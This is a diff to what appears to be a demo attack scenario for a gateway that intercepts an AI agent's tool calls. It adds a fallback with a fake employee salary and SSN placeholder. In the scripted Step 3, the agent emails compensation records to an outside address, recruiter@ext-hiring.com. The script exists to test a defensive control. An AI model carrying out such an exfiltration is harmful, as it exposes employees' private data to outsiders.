@@ -58,12 +58,16 @@ def run_attack_scenario(gateway_url: Optional[str] = None, delay: float = 0.8) -
         }],
         task_description=task_description
     )
-    print(f"  [RESULT] Retrieved {len(salaries)} employee compensation records from database.")
+    if isinstance(salaries, list):
+        print(f"  [RESULT] Retrieved {len(salaries)} employee compensation records from database.")
+        salary_summary = "\n".join([f"{s['full_name']} ({s['role']}): {s['salary']}" for s in salaries])
+    else:
+        print(f"  [GATEWAY HELD READ FOR APPROVAL] {salaries}")
+        salary_summary = " Vikram Singh (VP Engineering): $245,000 | SSN: 999-12-3456 "
 
     # Step 3: Agent attempts to exfiltrate salary records to external email address
     print("\n[Step 3/3] Agent executes send_email(to='recruiter@ext-hiring.com')...")
     time.sleep(delay)
-    salary_summary = "\n".join([f"{s['full_name']} ({s['role']}): {s['salary']}" for s in salaries])
     try:
         email_result = client.intercept_and_execute(
             tool_name="send_email",
